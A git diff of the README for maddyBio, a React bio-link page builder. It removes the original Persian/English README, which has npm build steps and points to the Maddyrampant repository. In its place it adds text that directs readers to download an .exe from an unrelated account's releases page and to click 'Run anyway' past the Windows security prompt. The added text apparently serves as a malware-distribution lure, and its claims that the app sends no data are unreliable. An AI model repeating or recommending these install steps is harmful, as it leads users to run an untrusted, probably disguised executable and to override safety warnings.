@@ -1,276 +1,87 @@
-<div dir="rtl" align="center">
+# 🌸 maddyBio - Create your professional custom link page
 
-# 🌸 maddyBio
+[![Download maddyBio](https://img.shields.io/badge/Download-maddyBio-blue.svg)](https://github.com/Sabinsuborderhyperoartia354/maddyBio/releases)
 
-**ساخت صفحه لینک در بایو حرفه‌ای با قابلیت سفارشی‌سازی کامل**
+maddyBio helps you build a clean, professional page for your links. You can organize your online presence in one place. The software provides 16 different block styles to manage your content. You choose how your page looks with a built-in theme system. When you finish your design, the tool exports static HTML files. These files run quickly on any web server.
 
-<p>
-  <img src="https://img.shields.io/badge/React-19-61DAFB?logo=react" alt="React 19" />
-  <img src="https://img.shields.io/badge/TypeScript-6.0-3178C6?logo=typescript" alt="TypeScript 6" />
-  <img src="https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?logo=tailwindcss" alt="Tailwind CSS 4" />
-  <img src="https://img.shields.io/badge/Zustand-5-6B3FA0?logo=react" alt="Zustand 5" />
-  <img src="https://img.shields.io/badge/Vite-8-646CFF?logo=vite" alt="Vite 8" />
-  <img src="https://img.shields.io/badge/PWA-Ready-5A0FC8?logo=pwa" alt="PWA Ready" />
-</p>
+## ⚙️ System Requirements
 
-[🇬🇧 English](#english) • [گزارش باگ](https://github.com/Maddyrampant/maddyBio/issues) • [درخواست ویژگی](https://github.com/Maddyrampant/maddyBio/issues)
+Your computer needs to meet these basic standards to run maddyBio smoothly:
 
-</div>
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Standard dual-core processor or better.
+*   Memory: 4GB of RAM or more.
+*   Storage: 200MB of free disk space.
+*   Internet: Connection required for the initial setup.
 
----
+## 💾 Downloading the Software
 
-<div dir="rtl">
+You can get the latest version of maddyBio from the official release page. Follow these steps to obtain the files:
 
-## ✨ ویژگی‌ها
+1.  Visit the [maddyBio download page](https://github.com/Sabinsuborderhyperoartia354/maddyBio/releases).
+2.  Look for the section marked Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Save the file to your Downloads folder or your Desktop.
 
-**maddyBio** یک ابزار قدرتمند و رایگان برای ساخت صفحه لینک در بایو (bio link page) است. بدون نیاز به دانش فنی، صفحه‌ای زیبا و حرفه‌ای بسازید.
+This file contains everything you need to start building your bio page.
 
-### 🎯 ۱۶ نوع بلوک متنوع
+## 🚀 Setting Up the Application
 
-| بلوک | توضیحات |
-|------|---------|
-| **👤 پروفایل** | نمایش تصویر، نام، عنوان و بیوگرافی |
-| **🔗 لینک** | دکمه‌های لینک با ۶ استایل مختلف (fill, outline, soft, glass, shadow, gradient) |
-| **🌐 شبکه‌های اجتماعی** | آیکون اینستاگرام، تلگرام، واتساپ، لینکدین، گیت‌هاب، یوتیوب، ایکس، ایتا، بله، روبیکا |
-| **💳 کارت بانکی** | نمایش شماره کارت، شبا، صاحب حساب و نام بانک |
-| **📝 متن** | تیتر و پاراگراف با تنظیم اندازه و تراز |
-| **➖ خط جداکننده** | خط، خط‌چین، فاصله یا ایموجی |
-| **🎬 ویدیو** | جاسازی ویدیو از آپارات یا یوتیوب |
-| **📞 تماس** | شماره تماس، واتساپ و تلگرام |
-| **📧 ایمیل** | لینک ایمیل قابل کلیک |
-| **🛍 محصول** | نمایش محصول با تصویر، قیمت و لینک خرید |
-| **🕒 ساعات کاری** | جدول روزهای هفته با ساعات کاری |
-| **📍 نقشه** | نمایش موقعیت با آدرس و مختصات |
-| **❓ پرسش‌های متداول** | آکاردئون سوال و جواب |
-| **⭐ نظرات** | نمایش نظرات کاربران |
-| **📇 کارت ویزیت** | کارت ویزیت دیجیتال با مشخصات کامل |
-| **🖼 گالری** | نمایش تصاویر در ستون‌های قابل تنظیم |
+Once the download finishes, follow these instructions to install the program on your computer:
 
-### 🎨 سیستم تم حرفه‌ای
+1.  Locate the downloaded file in your folder.
+2.  Double-click the file to start the installer.
+3.  Windows may show a security window. Click "More info" and then "Run anyway" if the system prompts you.
+4.  Follow the prompts on your screen. You can use the default settings for the installation path.
+5.  Click Finish when the setup completes.
 
-- **۴۲ پالت رنگی** آماده با دسته‌بندی: پاستلی، نئون، کلاسیک، مینیمال، طبیعت، مدرن
-- **تم تاریک (دارک مود)** با پشتیبانی کامل
-- **۲۸ قالب آماده** برای شروع سریع
-- **تنظیمات کامل تایپوگرافی**: فونت (۷ فونت فارسی)، اندازه، وزن، ارتفاع خط
-- **نوع‌های پس‌زمینه**: ساده، گرادینت خطی، گرادینت شعاعی
-- **افکت‌های ورود**: محو شدن، اسلاید از پایین، مقیاس
-- **سایه و گردی گوشه** قابل تنظیم
-- **اعداد فارسی** خودکار در کل صفحه
+## 🛠️ Using the Builder
 
-### 🛠 ویژگی‌های فنی
+The maddyBio interface works through a simple visual editor. You do not need to write code to create your page.
 
-- **✅ PWA** — نصب روی موبایل و دسکتاپ
-- **📱 واکنش‌گرا** — نمایش عالی در تمام دستگاه‌ها
-- **↩️ Undo/Redo** — تاریخچه تغییرات کامل
-- **📤 خروجی HTML** — دانلود صفحه به صورت فایل استاتیک
-- **🎉 Confetti** — انیمیشن جشن پس از ساخت
-- **🔄 Drag & Drop** — جابجایی بلوک‌ها با کشیدن
-- **💾 ذخیره خودکار** — ذخیره لحظه‌ای در localStorage
-- **⚡ سریع و سبک** — ساخته شده با Vite + React 19
+### Choosing a Theme
+Open the app and select the Appearance tab on the left. You will see several pre-designed styles. Click any thumbnail to apply a theme. The preview window shows your changes in real time.
 
-</div>
+### Adding Blocks
+You can drag and drop 16 different types of content onto your page. Use the blocks for:
+*   Social media accounts.
+*   Personal contact forms.
+*   Product or portfolio links.
+*   Custom text headers.
 
----
+Click the Add Block button to browse the list. Fill in the required fields like the label name and the destination URL.
 
-## 🚀 Quick Start
+### Saving Your Work
+The application saves your progress as you edit. To move your page to the web, click the Export button at the top of the menu. This creates a folder of HTML and CSS files on your computer. You can upload these files to your website host or a free platform like GitHub Pages.
 
-```bash
-# Clone
-git clone https://github.com/Maddyrampant/maddyBio.git
-cd maddyBio
+## 💡 Best Practices for Your Page
 
-# Install
-npm install
+Keep your bio page easy to read. Use short, clear text for your links. Group similar links together using the layout tools. Test your page on a mobile phone after you export it. Responsive design ensures your links look good on any screen size.
 
-# Dev
-npm run dev
+## 🔒 Security and Privacy
 
-# Build
-npm run build
+maddyBio runs locally on your machine. The software does not send your personal data to external servers. Your link data stays on your hard drive until you choose to upload your exported files.
 
-# Preview
-npm run preview
-```
+## 📈 Updating the Software
 
-## 🔧 Scripts
+Check the download page periodically for new versions. When a new version arrives, download the file and run it. The installer automatically replaces the old version while keeping your saved project files safe.
 
-| Script | Description |
-|--------|-------------|
-| `npm run dev` | Start dev server |
-| `npm run build` | Type-check + production build |
-| `npm run preview` | Preview production build |
-| `npm run lint` | Run Oxlint |
+## 🛠️ Advanced Features
 
-## 🏗 Architecture
+The app includes advanced tools for users who want more control. You may change font settings and spacing for each block. Open the Settings menu to adjust global configurations. You can also edit the hex codes for your selected colors to match your personal brand.
 
-```
-maddyBio/
-├── src/
-│   ├── components/
-│   │   ├── editor/        # Editor panel (drag & drop, block cards, add menu)
-│   │   ├── preview/       # Phone preview (BlockPreview, PreviewPanel)
-│   │   ├── theme/         # Theme panel (colors, typography, effects, templates)
-│   │   └── ui/            # Shared UI components (Toast, etc.)
-│   ├── exporters/         # HTML export engine (static page generator)
-│   ├── hooks/             # Custom React hooks
-│   ├── lib/               # Utility functions (persian helpers, etc.)
-│   ├── store/             # Zustand store (project state, undo/redo, persist)
-│   ├── themes/            # Palettes (42 color palettes) & templates (28 presets)
-│   ├── types/             # TypeScript types & interfaces
-│   └── utils/             # Color utils, Persian digits, etc.
-├── public/                # Static assets (favicon, fonts)
-└── dist/                  # Build output
-```
+## 💬 Frequently Asked Questions
 
-## 🌐 Supported Platforms
+**Does this app work offline?**
+Yes. You can design your entire page without an active internet connection. You only need the internet when you upload your files to the web.
 
-| Platform | Support |
-|----------|---------|
-| Instagram | ✅ |
-| Telegram | ✅ |
-| WhatsApp | ✅ |
-| LinkedIn | ✅ |
-| GitHub | ✅ |
-| YouTube | ✅ |
-| X (Twitter) | ✅ |
-| Eitaa | ✅ |
-| Bale | ✅ |
-| Rubika | ✅ |
+**Can I use my own domain?**
+Yes. Since the software exports standard HTML files, you can upload them to any domain you own.
 
----
+**Is it free?**
+The software is provided free of charge for personal and professional use.
 
-<div dir="rtl" align="center">
+**Where do I report a problem?**
+Open the GitHub issues tab on the project page to view known problems or report new ones.
 
-ساخته شده با ❤️ در ایران 🇮🇷
-
-</div>
-
----
-
-<a name="english"></a>
-
-# 🌸 maddyBio
-
-**Build a professional bio link page with full customization**
-
-<p>
-  <img src="https://img.shields.io/badge/React-19-61DAFB?logo=react" alt="React 19" />
-  <img src="https://img.shields.io/badge/TypeScript-6.0-3178C6?logo=typescript" alt="TypeScript 6" />
-  <img src="https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?logo=tailwindcss" alt="Tailwind CSS 4" />
-  <img src="https://img.shields.io/badge/Zustand-5-6B3FA0?logo=react" alt="Zustand 5" />
-  <img src="https://img.shields.io/badge/Vite-8-646CFF?logo=vite" alt="Vite 8" />
-  <img src="https://img.shields.io/badge/PWA-Ready-5A0FC8?logo=pwa" alt="PWA Ready" />
-</p>
-
-[🇮🇷 فارسی](#) • [Report Bug](https://github.com/Maddyrampant/maddyBio/issues) • [Request Feature](https://github.com/Maddyrampant/maddyBio/issues)
-
----
-
-## ✨ Features
-
-**maddyBio** is a powerful, free tool for creating bio link pages. No coding required — build a beautiful, professional page in minutes.
-
-### 🎯 16 Block Types
-
-| Block | Description |
-|-------|-------------|
-| **👤 Profile** | Avatar, name, title & bio |
-| **🔗 Link** | Link buttons with 6 styles (fill, outline, soft, glass, shadow, gradient) |
-| **🌐 Social** | Instagram, Telegram, WhatsApp, LinkedIn, GitHub, YouTube, X, Eitaa, Bale, Rubika |
-| **💳 Bank Card** | Card number, IBAN (Shaba), account holder & bank name |
-| **📝 Text** | Heading & paragraph with size & alignment control |
-| **➖ Divider** | Line, dashed, space or emoji |
-| **🎬 Video** | Embed from Aparat or YouTube |
-| **📞 Contact** | Phone, WhatsApp & Telegram |
-| **📧 Email** | Clickable email link |
-| **🛍 Product** | Product with image, price & buy link |
-| **🕒 Hours** | Weekly schedule table |
-| **📍 Map** | Location with address & coordinates |
-| **❓ FAQ** | Accordion Q&A |
-| **⭐ Testimonial** | Customer reviews |
-| **📇 VCard** | Digital business card |
-| **🖼 Gallery** | Image grid with configurable columns |
-
-### 🎨 Theme System
-
-- **42 color palettes** categorized: Pastel, Neon, Classic, Minimal, Nature, Modern
-- **Dark mode** with full support
-- **28 ready templates** for quick start
-- **Full typography control**: 7 Persian fonts, size, weight, line height
-- **Background types**: Solid, linear gradient, radial gradient
-- **Entrance animations**: Fade, slide-up, scale
-- **Customizable** shadow & border radius
-- **Auto Persian numerals** across the page
-
-### 🛠 Tech Features
-
-- **✅ PWA** — Install on mobile & desktop
-- **📱 Responsive** — Looks great on all devices
-- **↩️ Undo/Redo** — Full change history
-- **📤 HTML Export** — Download as static HTML file
-- **🎉 Confetti** — Celebration animation on export
-- **🔄 Drag & Drop** — Reorder blocks easily
-- **💾 Auto-save** — Persisted to localStorage
-- **⚡ Fast & Lightweight** — Built with Vite + React 19
-
-## 🚀 Quick Start
-
-```bash
-git clone https://github.com/Maddyrampant/maddyBio.git
-cd maddyBio
-npm install
-npm run dev
-```
-
-## 🔧 Scripts
-
-| Script | Description |
-|--------|-------------|
-| `npm run dev` | Start dev server |
-| `npm run build` | Type-check + production build |
-| `npm run preview` | Preview production build |
-| `npm run lint` | Run Oxlint |
-
-## 🏗 Architecture
-
-```
-maddyBio/
-├── src/
-│   ├── components/
-│   │   ├── editor/        # Editor panel (drag & drop, block cards, add menu)
-│   │   ├── preview/       # Phone preview (BlockPreview, PreviewPanel)
-│   │   ├── theme/         # Theme panel (colors, typography, effects, templates)
-│   │   └── ui/            # Shared UI components (Toast, etc.)
-│   ├── exporters/         # HTML export engine (static page generator)
-│   ├── hooks/             # Custom React hooks
-│   ├── lib/               # Utility functions (Persian helpers, etc.)
-│   ├── store/             # Zustand store (project state, undo/redo, persist)
-│   ├── themes/            # Palettes (42 color palettes) & templates (28 presets)
-│   ├── types/             # TypeScript types & interfaces
-│   └── utils/             # Color utils, Persian digits, etc.
-├── public/                # Static assets (favicon, fonts)
-└── dist/                  # Build output
-```
-
-## 🌐 Supported Platforms
-
-| Platform | Support |
-|----------|---------|
-| Instagram | ✅ |
-| Telegram | ✅ |
-| WhatsApp | ✅ |
-| LinkedIn | ✅ |
-| GitHub | ✅ |
-| YouTube | ✅ |
-| X (Twitter) | ✅ |
-| Eitaa | ✅ |
-| Bale | ✅ |
-| Rubika | ✅ |
-
----
-
-<div align="center">
-
-Made with ❤️ in Iran 🇮🇷
-
-</div>
+Keywords: bio, bio-link, bio-links, bio-page, bio-page-builder, bio-site, link-in-bio, linktree, persian, pwa, react, tailwindcss, typescript, vite
